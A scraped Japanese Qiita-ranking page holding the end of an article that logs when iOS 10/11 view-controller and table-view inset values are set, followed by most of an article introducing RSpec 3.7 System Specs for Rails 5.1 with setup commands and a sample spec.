<a href="https://camo.qiitausercontent.com/bc5515cad0385f8d0fd752718d794ab4d4cfb58b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f63376137386434352d396563632d663461392d623363322d3630616332636465353366632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/bc5515cad0385f8d0fd752718d794ab4d4cfb58b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f63376137386434352d396563632d663461392d623363322d3630616332636465353366632e706e67" alt="Screen Shot 2017-10-16 at 3.51.57.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/c7a78d45-9ecc-f4a9-b3c2-60ac2cde53fc.png"></a></p>

<h1>
<span id="insetsが設定されるタイミング" class="fragment"></span><a href="#insets%E3%81%8C%E8%A8%AD%E5%AE%9A%E3%81%95%E3%82%8C%E3%82%8B%E3%82%BF%E3%82%A4%E3%83%9F%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>Insetsが設定されるタイミング</h1>

<p>コードで、Insetsの値を考慮したコンテンツサイズからゴニョゴニョする場合、そのタイミングが大事。<br>
viewDidLoadのタイミングではInsetsは設定されていないからです。<br>
基本的には ***DidChange のメソッドが用意されているので、そのタイミングをトリガーします。</p>

<p>具体的に、どのタイミングで設定されるのかをログをとってみました。<br>
半透明なナビゲーションバー、タブバーとテーブルを配置し、iPhone6sのシミュレータで実行したものです。<br>
各メソッドが呼ばれた順に、その時点の値を記述しています。</p>

<h2>
<span id="uiviewcontrollersafeareainsets" class="fragment"></span><a href="#uiviewcontrollersafeareainsets"><i class="fa fa-link"></i></a>UIViewController.safeAreaInsets</h2>

<p>(iOS11で追加)<br>
viewSafeAreaInsetsDidChange以降で確定</p>

<table>
<thead>
<tr>
<th>Timing</th>
<th>Top</th>
<th>Left</th>
<th>Bottom</th>
<th>Right</th>
</tr>
</thead>
<tbody>
<tr>
<td>loadView</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>viewDidLoad</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>viewWillAppear</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>viewSafeAreaInsetsDidChange</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
<tr>
<td>traitCollectionDidChange</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
<tr>
<td>viewDidAppear</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
</tbody>
</table>

<h2>
<span id="uitableviewsafeareainsets" class="fragment"></span><a href="#uitableviewsafeareainsets"><i class="fa fa-link"></i></a>UITableView.safeAreaInsets</h2>

<p>(iOS11で追加)<br>
子ViewであるUITableView の SafeAreaInsetsは、UIViewController.viewSafeAreaInsetsDidChangeではまだ確定していない。UITableViewのsafeAreaInsetsDidChange 以降で決まる</p>

<table>
<thead>
<tr>
<th>Timing</th>
<th></th>
<th>Top</th>
<th>Left</th>
<th>Bottom</th>
<th>Right</th>
</tr>
</thead>
<tbody>
<tr>
<td>UIViewController</td>
<td>loadView</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidLoad</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewWillAppear</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewSafeAreaInsetsDidChange</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>safeAreaInsetsDidChange</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>traitCollectionDidChange</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidAppear</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
</tbody>
</table>

<h2>
<span id="uitableviewlayoutmargins" class="fragment"></span><a href="#uitableviewlayoutmargins"><i class="fa fa-link"></i></a>UITableView.layoutMargins</h2>

<h3>
<span id="ios11" class="fragment"></span><a href="#ios11"><i class="fa fa-link"></i></a>iOS11</h3>

<p>iOS11の時は、SafeAreaInsetsの値も含めた合計値になる。<br>
UITableView.layoutMarginsDidChangeは2回呼ばれた。1回目は端末サイズに合わせた値になったもの、2回目はSafeAreaの値が反映されたもの。</p>

<table>
<thead>
<tr>
<th>Timing</th>
<th></th>
<th>Top</th>
<th>Left</th>
<th>Bottom</th>
<th>Right</th>
</tr>
</thead>
<tbody>
<tr>
<td>UIViewController</td>
<td>loadView</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidLoad</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewWillAppear</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>layoutMarginsDidChange</td>
<td>8.0</td>
<td>15.0</td>
<td>8.0</td>
<td>15.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewSafeAreaInsetsDidChange</td>
<td>8.0</td>
<td>15.0</td>
<td>8.0</td>
<td>15.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>layoutMarginsDidChange</td>
<td>72.0</td>
<td>15.0</td>
<td>57.0</td>
<td>15.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>safeAreaInsetsDidChange</td>
<td>72.0</td>
<td>15.0</td>
<td>57.0</td>
<td>15.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>traitCollectionDidChange</td>
<td>72.0</td>
<td>15.0</td>
<td>57.0</td>
<td>15.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidAppear</td>
<td>72.0</td>
<td>15.0</td>
<td>57.0</td>
<td>15.0</td>
</tr>
</tbody>
</table>

<p>5.5インチの端末のTable.layoutMarginの左右は20ptになります。</p>

<h3>
<span id="ios10" class="fragment"></span><a href="#ios10"><i class="fa fa-link"></i></a>iOS10</h3>

<table>
<thead>
<tr>
<th>Timing</th>
<th></th>
<th>Top</th>
<th>Left</th>
<th>Bottom</th>
<th>Right</th>
</tr>
</thead>
<tbody>
<tr>
<td>UIViewController</td>
<td>loadView</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidLoad</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewWillAppear</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
<td>8.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>layoutMarginsDidChange</td>
<td>8.0</td>
<td>15.0</td>
<td>8.0</td>
<td>15.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewSafeAreaInsetsDidChange</td>
<td>8.0</td>
<td>15.0</td>
<td>8.0</td>
<td>15.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>layoutMarginsDidChange</td>
<td>8.0</td>
<td>15.0</td>
<td>8.0</td>
<td>15.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>traitCollectionDidChange</td>
<td>8.0</td>
<td>15.0</td>
<td>8.0</td>
<td>15.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidAppear</td>
<td>8.0</td>
<td>15.0</td>
<td>8.0</td>
<td>15.0</td>
</tr>
</tbody>
</table>

<h2>
<span id="uitableviewcontentinset" class="fragment"></span><a href="#uitableviewcontentinset"><i class="fa fa-link"></i></a>UITableView.contentInset</h2>

<p>UITableView.contentInsetは、iOS10とiOS11とで変わる。<br>
iOS11では.zeroになり、代わりに、adjustedContentInsetに値が入る。</p>

<table>
<thead>
<tr>
<th>Timing</th>
<th></th>
<th>iOS10: Content Inset</th>
<th>iOS11:Content Inset</th>
</tr>
</thead>
<tbody>
<tr>
<td>UIViewController</td>
<td>loadView</td>
<td>(0,0,0,0)</td>
<td>(0,0,0,0)</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidLoad</td>
<td>(0,0,0,0)</td>
<td>(0,0,0,0)</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewWillAppear</td>
<td>(0,0,0,0)</td>
<td>(0,0,0,0)</td>
</tr>
<tr>
<td>UIViewController</td>
<td>traitCollectionDidChange</td>
<td>(64, 0, 49, 0)</td>
<td>(0,0,0,0)</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidAppear</td>
<td>(64, 0, 49, 0)</td>
<td>(0,0,0,0)</td>
</tr>
</tbody>
</table>

<h2>
<span id="uitableviewadjustedcontentinset" class="fragment"></span><a href="#uitableviewadjustedcontentinset"><i class="fa fa-link"></i></a>UITableView.adjustedContentInset</h2>

<p>(iOS11で追加)<br>
contentInsetAdjustmentBehaviorの設定により変わります。<br>
デフォルトの automatic指定のときの結果です。</p>

<table>
<thead>
<tr>
<th>Timing</th>
<th></th>
<th>Top</th>
<th>Left</th>
<th>Bottom</th>
<th>Right</th>
</tr>
</thead>
<tbody>
<tr>
<td>UIViewController</td>
<td>loadView</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidLoad</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewWillAppear</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>layoutMarginsDidChange</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewSafeAreaInsetsDidChange</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>layoutMarginsDidChange</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>safeAreaInsetsDidChange</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UITableView</td>
<td>adjustedContentInsetDidChange</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>traitCollectionDidChange</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
<tr>
<td>UIViewController</td>
<td>viewDidAppear</td>
<td>64.0</td>
<td>0.0</td>
<td>49.0</td>
<td>0.0</td>
</tr>
</tbody>
</table>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">90位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>105</kbd>
		<a target="_blank" href="https://qiita.com/jnchito/items/c7e6e7abf83598a6516d">rspec-rails 3.7の新機能！System Specを使ってみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-24<br />07:35:35</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/7465.html">jnchito</a>(165件の記事)<br />(SonicGarden Inc. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/7465/profile-images/1500323590">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Ruby]</b> <b>[Rails]</b> <b>[RSpec]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h2>

<p>先日、RSpec 3.7がリリースされました。</p>

<p>参考: <a href="http://rspec.info/blog/2017/10/rspec-3-7-has-been-released/" rel="nofollow noopener" target="_blank">RSpec 3.7 has been released!</a></p>

<p>上記ブログの中で「今回のリリースはRailsのSystem Testの統合機能をいち早く使ってもらうためのリリースだ」と書いてあります。<br>
実際、ブログの中で触れられている新機能は「System Spec」機能の追加だけです。</p>

<p>というわけで、この記事はrspec-rails 3.7で導入されたSystem Specの紹介と使い方の説明をしていきます。</p>

<h3>
<span id="実行環境" class="fragment"></span><a href="#%E5%AE%9F%E8%A1%8C%E7%92%B0%E5%A2%83"><i class="fa fa-link"></i></a>実行環境</h3>

<p>この記事は以下のバージョンを対象にして書かれています。</p>

<ul>
<li>rspec-rails 3.7.1</li>
<li>Rails 5.1.4</li>
<li>Ruby 2.4.2</li>
<li>selenium-webdriver 3.6.0</li>
<li>Capybara 2.15.4</li>
<li>Chrome 62</li>
<li>ChromeDriver 2.33</li>
</ul>

<h3>
<span id="サンプルコード" class="fragment"></span><a href="#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>サンプルコード</h3>

<p>この記事で使用したコードはこちらに置いてあります。</p>

<p><a href="https://github.com/JunichiIto/rails-5-1-system-test-sandbox/tree/rspec-3-7" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/JunichiIto/rails-5-1-system-test-sandbox/tree/rspec-3-7</a></p>

<h2>
<span id="system-specとは" class="fragment"></span><a href="#system-spec%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>System Specとは？</h2>

<p>Rails 5.1ではSystemTestCaseという新機能が導入されました。<br>
これはいわゆるエンドツーエンド（E2E）テストを実行するための新機能です。<br>
このテストケースクラスを使うと、JavaScriptを利用する画面のテストが書けるようになります。</p>

<p>参考: <a href="https://qiita.com/jnchito/items/4d01f2faa1deee36bd27" id="reference-e56e98360302faf34e5d">Rails 5.1のSystemTestCaseを試してみた - Qiita</a></p>

<p>RailsではMinitestがデフォルトのテスティングフレームワークであるため、SystemTestCaseでもMinitestを使います。</p>

<p>rspec-rails 3.7で導入されたSystem Specは、このSystemTestCaseをRSpecから利用するための新機能です。</p>

<h2>
<span id="feature-specと何が違うのどっちを使えばいいの" class="fragment"></span><a href="#feature-spec%E3%81%A8%E4%BD%95%E3%81%8C%E9%81%95%E3%81%86%E3%81%AE%E3%81%A9%E3%81%A3%E3%81%A1%E3%82%92%E4%BD%BF%E3%81%88%E3%81%B0%E3%81%84%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a>Feature Specと何が違うの？どっちを使えばいいの？</h2>

<p>rspec-railsではすでにFeature Spec（フィーチャスペック）というE2Eテスト用の機能が用意されています。<br>
System SpecもE2Eテスト用の機能なので、単純に考えるとE2Eテスト用の機能が複数存在することになります。</p>

<p>実際、この両者はよく似ているのですが、System SpecはRails標準のSystemTestCaseをラップしているため、以下のような違いがあります。</p>

<ul>
<li>デフォルトでselnium-webdriver + Chrome上でテストが実行される。</li>
<li>DatabaseCleanerやDatabaseRewinderを使ってトランザクション管理をする必要がない。</li>
<li>テストが失敗すると自動的にtmp/screenshotsディレクトリにスクリーンショットを保存してくれる。</li>
</ul>

<p>まだ本格的には使い込んでいませんが、ざっと見た感じでは「もうFeature SpecやDatabaseCleanerはいらなくなるのでは？」と思っています。</p>

<p>冒頭で紹介した<a href="http://rspec.info/blog/2017/10/rspec-3-7-has-been-released/" rel="nofollow noopener" target="_blank">公式ブログ</a>でも「Rails 5.1を使っている場合はFeature SpecよりもSystem Specの使用を推奨します」と書いてあります。</p>

<h2>
<span id="system-specを使ってみる" class="fragment"></span><a href="#system-spec%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%BF%E3%82%8B"><i class="fa fa-link"></i></a>System Specを使ってみる</h2>

<p>ではここから、System Specを実際に使う方法を説明していきます。</p>

<h3>
<span id="使用するサンプルアプリケーション" class="fragment"></span><a href="#%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>使用するサンプルアプリケーション</h3>

<p>今回は以下のようなサンプルアプリケーションでSystem Specを実行してみます。<br>
このアプリケーションでは郵便番号を入力すると、JavaScriptによって自動的に住所が入力されるようになっています。</p>

<p><a href="https://camo.qiitausercontent.com/d81b8cc520a87c17fa8d0e01f417ac401c9ba6f8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373436352f34313632346631312d316234642d376636322d396433662d3437626265363365636162342e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d81b8cc520a87c17fa8d0e01f417ac401c9ba6f8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f373436352f34313632346631312d316234642d376636322d396433662d3437626265363365636162342e676966" alt="y9W2aFx3zv.gif" title="y9W2aFx3zv.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/7465/41624f11-1b4d-7f62-9d3f-47bbe63ecab4.gif"></a></p>

<p>コードはGitHubに置いてあります。</p>

<p><a href="https://github.com/JunichiIto/rails-5-1-system-test-sandbox/tree/rspec-3-7" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/JunichiIto/rails-5-1-system-test-sandbox/tree/rspec-3-7</a></p>

<h3>
<span id="chromeとchromedriverをインストールする" class="fragment"></span><a href="#chrome%E3%81%A8chromedriver%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>ChromeとChromeDriverをインストールする</h3>

<p>System SpecではChromeとChromeDriverをマシンにインストールする必要があります。<br>
どちらも最新版をインストールするようにしましょう。</p>

<p>ChromeDriverのインストールはいくつか方法があります。</p>

<ul>
<li>
<a href="https://sites.google.com/a/chromium.org/chromedriver/downloads" rel="nofollow noopener" target="_blank">自分でダウンロード</a>してPATHの通ったディレクトリに置く。</li>
<li>Homebrewでインストールする。</li>
</ul>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span># 新規インストール
$ brew install chromedriver

# 最新版にアップデート
$ brew upgrade chromedriver
</pre></div></div>

<ul>
<li>
<a href="https://github.com/flavorjones/chromedriver-helper" rel="nofollow noopener" target="_blank">chromedriver-helper</a> gemを使う。</li>
</ul>

<p>今回は一番手軽なchromedriver-helper gemを使うことにします。<br>
Gemfileにchromedriver-helperを追加して、<code>bundle install</code>してください。</p>

<div class="code-frame" data-lang="rb">
<div class="code-lang"><span class="bold">Gemfile</span></div>
<div class="highlight"><pre><span></span><span class="n">group</span> <span class="ss">:test</span> <span class="k">do</span>
  <span class="c1"># ...</span>
  <span class="n">gem</span> <span class="s1">'chromedriver-helper'</span>
<span class="k">end</span>
</pre></div>
</div>

<h3>
<span id="rails-51以上であることを確認する" class="fragment"></span><a href="#rails-51%E4%BB%A5%E4%B8%8A%E3%81%A7%E3%81%82%E3%82%8B%E3%81%93%E3%81%A8%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Rails 5.1以上であることを確認する</h3>

<p>System SpecはRailsのSystemTestCaseを利用するため、Rails 5.1以上であることが必須です。</p>

<div class="code-frame" data-lang="rb">
<div class="code-lang"><span class="bold">Gemfile</span></div>
<div class="highlight"><pre><span></span><span class="n">gem</span> <span class="s1">'rails'</span><span class="p">,</span> <span class="s1">'~&gt; 5.1.4'</span>
</pre></div>
</div>

<h3>
<span id="テスト関連のgemをインストールアップデートする" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88%E9%96%A2%E9%80%A3%E3%81%AEgem%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%82%A2%E3%83%83%E3%83%97%E3%83%87%E3%83%BC%E3%83%88%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>テスト関連のgemをインストール/アップデートする</h3>

<p>テストに必要なgemを追加して、<code>bundle install</code>します。</p>

<div class="code-frame" data-lang="rb">
<div class="code-lang"><span class="bold">Gemfile</span></div>
<div class="highlight"><pre><span></span><span class="n">group</span> <span class="ss">:development</span><span class="p">,</span> <span class="ss">:test</span> <span class="k">do</span>
  <span class="c1"># ...</span>
  <span class="n">gem</span> <span class="s1">'rspec-rails'</span>
<span class="k">end</span>

<span class="n">group</span> <span class="ss">:test</span> <span class="k">do</span>
  <span class="c1"># ...</span>
  <span class="n">gem</span> <span class="s1">'capybara'</span>
  <span class="n">gem</span> <span class="s1">'selenium-webdriver'</span>
<span class="k">end</span>
</pre></div>
</div>

<p>これまでRSpecを使っていなかった場合は、以下のコマンドで必要なファイルも追加してください。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ rails generate rspec:install
</pre></div></div>

<p>既存のプロジェクトですでにテスト用のgemがインストールされていた場合は、以下のコマンドで各種gemを最新版にアップデートしておきましょう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ bundle update rspec-rails capybara selenium-webdriver
</pre></div></div>

<h3>
<span id="system-specを書く" class="fragment"></span><a href="#system-spec%E3%82%92%E6%9B%B8%E3%81%8F"><i class="fa fa-link"></i></a>System Specを書く</h3>

<p>System Specを配置するspec/systemディレクトリを作ります。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ mkdir spec/system
</pre></div></div>

<p>今回は<code>users_spec.rb</code>というファイルにSystem Specを書きます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ touch spec/system/users_spec.rb
</pre></div></div>

<p><code>users_spec.rb</code>に次のようなコードを書きます。</p>

<div class="code-frame" data-lang="rb">
<div class="code-lang"><span class="bold">spec/system/users_spec.rb</span></div>
<div class="highlight"><pre><span></span><span class="nb">require</span> <span class="s1">'rails_helper'</span>

<span class="no">RSpec</span><span class="o">.</span><span class="n">describe</span> <span class="s1">'Users'</span><span class="p">,</span> <span class="ss">type</span><span class="p">:</span> <span class="ss">:system</span> <span class="k">do</span>
  <span class="n">before</span> <span class="k">do</span>
    <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">create!</span><span class="p">(</span><span class="nb">name</span><span class="p">:</span> <span class="s1">'いとう'</span><span class="p">)</span>
  <span class="k">end</span>

  <span class="n">it</span> <span class="s1">'completes yubinbango automatically with JS'</span> <span class="k">do</span>
    <span class="c1"># User編集画面を開く</span>
    <span class="n">visit</span> <span class="n">edit_user_path</span><span class="p">(</span><span class="vi">@user</span><span class="p">)</span>

    <span class="c1"># Nameに"いとう"が入力されていることを検証する</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_field</span> <span class="s1">'名前'</span><span class="p">,</span> <span class="ss">with</span><span class="p">:</span> <span class="s1">'いとう'</span>

    <span class="c1"># 郵便番号を入力</span>
    <span class="n">fill_in</span> <span class="s1">'郵便番号'</span><span class="p">,</span> <span class="ss">with</span><span class="p">:</span> <span class="s1">'158-0083'</span>
    <span class="c1"># 住所が自動入力されたことを検証する</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_field</span> <span class="s1">'住所'</span><span class="p">,</span> <span class="ss">with</span><span class="p">:</span> <span class="s1">'東京都世田谷区奥沢'</span>

    <span class="c1"># 更新実行</span>
    <span class="n">click_button</span> <span class="s1">'Update User'</span>

    <span class="c1"># 正しく更新されていること（＝画面の表示が正しいこと）を検証する</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_content</span> <span class="s1">'User was successfully updated.'</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_content</span> <span class="s1">'いとう'</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_content</span> <span class="s1">'158-0083'</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_content</span> <span class="s1">'東京都世田谷区奥沢'</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div>
</div>

<p>3行目で<code>type: :system</code>と書いてあるのがポイントです。<br>
これでこのテストがSystem Specであることを宣言しています。</p>

<p>それ以外は基本的にFeature Specと書き方は変わりません。</p>

<h3>
<span id="system-specを実行する" class="fragment"></span><a href="#system-spec%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>System Specを実行する</h3>

<p>テストが書き終わったら、テストを実行してみましょう。<br>
実行方法は通常のRSpecの場合と変わりません。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ rails spec
</pre></div></div>

<p>セットアップがうまくいっていれば、自動的にChromeが起動してSystem Testで書いた内容を実行してくれるはずです。</p>

<p>Feature Specでは必要だったDatabaseCleaner/DatabaseRewinder用の設定や、<code>rails_helper.rb</code>での<code>Capybara.javascript_driver</code>の指定は不要になります。</p>

<h2>
<span id="応用編" class="fragment"></span><a href="#%E5%BF%9C%E7%94%A8%E7%B7%A8"><i class="fa fa-link"></i></a>応用編</h2>

<h3>
<span id="describeitではなくfeaturescenarioを使う" class="fragment"></span><a href="#describeit%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%8Ffeaturescenario%E3%82%92%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a>describe/itではなく、feature/scenarioを使う</h3>

<p>サンプルコードではdescribe/itを使っていますが、Feature Specと同様にfeature/scenarioを使って書くこともできます。</p>

<div class="code-frame" data-lang="ruby"><div class="highlight"><pre><span></span><span class="nb">require</span> <span class="s1">'rails_helper'</span>

<span class="no">RSpec</span><span class="o">.</span><span class="n">feature</span> <span class="s1">'Users'</span><span class="p">,</span> <span class="ss">type</span><span class="p">:</span> <span class="ss">:system</span> <span class="k">do</span>
  <span class="n">background</span> <span class="k">do</span>
    <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">create!</span><span class="p">(</span><span class="nb">name</span><span class="p">:</span> <span class="s1">'いとう'</span><span class="p">)</span>
  <span class="k">end</span>

  <span class="n">scenario</span> <span class="s1">'completes yubinbango automatically with JS'</span> <span class="k">do</span>
    <span class="c1"># User編集画面を開く</span>
    <span class="n">visit</span> <span class="n">edit_user_path</span><span class="p">(</span><span class="vi">@user</span><span class="p">)</span>

    <span class="c1"># Nameに"いとう"が入力されていることを検証する</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_field</span> <span class="s1">'名前'</span><span class="p">,</span> <span class="ss">with</span><span class="p">:</span> <span class="s1">'いとう'</span>

    <span class="c1"># 郵便番号を入力</span>
    <span class="n">fill_in</span> <span class="s1">'郵便番号'</span><span class="p">,</span> <span class="ss">with</span><span class="p">:</span> <span class="s1">'158-0083'</span>
    <span class="c1"># 住所が自動入力されたことを検証する</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_field</span> <span class="s1">'住所'</span><span class="p">,</span> <span class="ss">with</span><span class="p">:</span> <span class="s1">'東京都世田谷区奥沢'</span>

    <span class="c1"># 更新実行</span>
    <span class="n">click_button</span> <span class="s1">'Update User'</span>

    <span class="c1"># 正しく更新されていること（＝画面の表示が正しいこと）を検証する</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_content</span> <span class="s1">'User was successfully updated.'</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_content</span> <span class="s1">'いとう'</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_content</span> <span class="s1">'158-0083'</span>
    <span class="n">expect</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">.</span><span class="n">to</span> <span class="n">have_content</span> <span class="s1">'東京都世田谷区奥沢'</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></div></div>

<h3>
<span id="ヘッドレスモードのchromeで実行する" class="fragment"></span><a href="#%E3%83%98%E3%83%83%E3%83%89%E3%83%AC%E3%82%B9%E3%83%A2%E3%83%BC%E3%83%89%E3%81%AEchrome%E3%81%A7%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>ヘッドレスモードのChromeで実行する</h3>

